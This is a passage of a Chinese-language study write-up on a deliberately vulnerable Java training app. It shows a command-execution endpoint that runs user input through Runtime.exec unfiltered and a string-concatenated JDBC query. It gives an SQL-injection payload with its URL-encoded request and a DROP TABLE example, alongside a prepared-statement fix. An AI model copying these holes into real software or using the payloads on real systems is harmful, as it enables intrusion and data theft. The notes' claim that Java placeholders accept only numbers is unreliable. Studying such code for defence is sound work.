#ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/runtime/exec&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> CommandExec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">cmd</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">run</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//直接执行，无过滤</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sb</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">StringBuilder</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">run</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">BufferedInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BufferedInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">BufferedReader</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">inBr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BufferedReader</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InputStreamReader</span><span style="color: #ABB2BF">(in));</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tmpStr</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> ((tmpStr </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">inBr</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readLine</span><span style="color: #ABB2BF">()) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(tmpStr);</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">waitFor</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exitValue</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Command exec failed!!&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">inBr</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">in</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure><p>Runtime.getRuntime().exec()，ProcessBuilder、通过yaml加载恶意Java对象进行命令执行，通过groovyShell进行命令执行</p><p>执行之后执行结果推送回前端显示</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>\src\main\java\org\joychou\controller\SQLI.java</p><p>定义的方法：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">jdbc_sqli_vul（漏洞方法）</span></span><span class="line"><span style="color: #E06C75">jdbc_sqli_sec（安全方法）</span></span><span class="line"><span style="color: #E06C75">jdbc_ps_vuln</span></span><span class="line"><span style="color: #E06C75">mybatisVuln01（漏洞方法）</span></span><span class="line"><span style="color: #E06C75">mybatisVuln02（漏洞方法）</span></span><span class="line"><span style="color: #E06C75">mybatisVuln03（漏洞方法）</span></span><span class="line"><span style="color: #E06C75">mybatisSec01（安全方法）</span></span><span class="line"><span style="color: #E06C75">mybatisSec02（安全方法）</span></span><span class="line"><span style="color: #E06C75">mybatisSec03（安全方法）</span></span><span class="line"><span style="color: #E06C75">mybatisOrderBySec04（安全方法）</span></span></code></pre></div></div></figure><h3 id="jdbc-sqli-vul"><a href="#jdbc-sqli-vul" class="headerlink" title="jdbc_sqli_vul"></a>jdbc_sqli_vul</h3><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * &lt;p&gt;Sql injection jbdc vuln code.&lt;/p&gt;&lt;br&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * &lt;a href=&quot;http://localhost:8080/sqli/jdbc/vuln?username=joychou&quot;&gt;http://localhost:8080/sqli/jdbc/vuln?username=joychou&lt;/a&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     */</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/jdbc/vuln&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">jdbc_sqli_vul</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username) {</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #E06C75"> result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">StringBuilder</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(driver);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> con </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DriverManager</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(url, user, password);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isClosed</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Connect to database successfully.&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #7F848E; font-style: italic">// sqli vuln code</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Statement</span><span style="color: #E06C75"> statement </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createStatement</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;select * from users where username = &#39;&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> username </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;&#39;&quot;</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//直接拼接語句存在sql漏洞</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">ResultSet</span><span style="color: #E06C75"> rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">statement</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">executeQuery</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">while</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> res_name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> res_pwd </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;password&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;%s: %s</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, res_name, res_pwd);</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sorry, can&#39;t find the Driver!&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">SQLException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>直接拼接語句存在sql漏洞（对于参数username进行带入数据库查询）</p></li><li><p>payload</p><p>username&#x3D;1’ or ‘1’&#x3D;’1<br>url编码：username&#x3D;1%27%20or%20%271%27&#x3D;%271</p><p>最终的payload：sqli&#x2F;jdbc&#x2F;vuln?username&#x3D;1%27%20or%20%271%27&#x3D;%271</p></li></ol><h3 id="jdbc-sqli-sec"><a href="#jdbc-sqli-sec" class="headerlink" title="jdbc_sqli_sec"></a>jdbc_sqli_sec</h3><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * &lt;p&gt;Sql injection jbdc security code by using {@link PreparedStatement}.&lt;/p&gt;&lt;br&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> *</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * &lt;a href=&quot;http://localhost:8080/sqli/jdbc/sec?username=joychou&quot;&gt;http://localhost:8080/sqli/jdbc/sec?username=joychou&lt;/a&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> */</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/jdbc/sec&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">jdbc_sqli_sec</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username) {</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #E06C75"> result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">StringBuilder</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(driver);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> con </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DriverManager</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(url, user, password);</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isClosed</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Connect to database successfully.&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">// fix code</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;select * from users where username = ?&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">PreparedStatement</span><span style="color: #E06C75"> st </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">prepareStatement</span><span style="color: #ABB2BF">(sql);</span><span style="color: #7F848E; font-style: italic">//使用了PreparedStatement接口来访问数据库   </span></span><span class="line"><span style="color: #E06C75">        </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">st</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setString</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, username);</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">st</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// sql after prepare statement</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ResultSet</span><span style="color: #E06C75"> rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">st</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">executeQuery</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">while</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> res_name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> res_pwd </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;password&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;%s: %s</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, res_name, res_pwd);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sorry, can&#39;t find the Driver!&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">SQLException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">PreparedStatement</span><span style="color: #E06C75"> st </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">con</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">prepareStatement</span><span style="color: #ABB2BF">(sql);</span><span style="color: #7F848E; font-style: italic">//使用了PreparedStatement接口来访问数据库</span></span></code></pre></div></div></figure><ul><li><p><code>PreparedStatement</code> 接口是 Java 中用于执行预编译 SQL 语句的关键接口，它继承自 <code>Statement</code> 接口，主要用于执行参数化 SQL 语句。使用 <code>PreparedStatement</code> 可以有效防止 SQL 注入攻击，并且在执行多次相同结构的 SQL 语句时能提高性能。</p><p><strong>防护sql：</strong></p><ol><li><p>使用预编译：使用？（占位符）传递参数，数据库自动处理参数转义</p><p>解释：对于php使用？传入的未限制是数字还是字符；但是java中使用？传入限制只能是数字，如果不是数字，那么会加以过滤（转义&#x2F;加入特殊字符）</p><p>eg：</p><table><thead><tr><th><strong>用户输入</strong></th><th><strong>字符串拼接结果</strong></th><th><strong>预编译处理结果</strong></th></tr></thead><tbody><tr><td><code>1</code></td><td><code>WHERE id = &#39;1&#39;</code></td><td><code>WHERE id = 1</code></td></tr><tr><td><code>1 OR 1=1</code></td><td><code>WHERE id = &#39;1 OR 1=1&#39;</code>（逻辑被篡改）</td><td><code>WHERE id = &#39;1 OR 1=1&#39;</code>（纯字符串）</td></tr><tr><td><code>1&#39;; DROP TABLE users</code></td><td><code>WHERE id = &#39;1&#39;; DROP TABLE users</code>（表被删除）</td><td><code>WHERE id = &#39;1\&#39;; DROP TABLE users&#39;</code>（安全）</td></tr></tbody></table></li><li><p>存在对于特殊字符的转义</p></li><li><p>禁用动态 SQL 拼接：避免在代码中手动拼接 SQL，尤其是包含用户输入的部分。若必须使用动态 SQL，需严格验证输入。</p></li></ol></li></ul></li><li><p>所以java中：<br>不只order 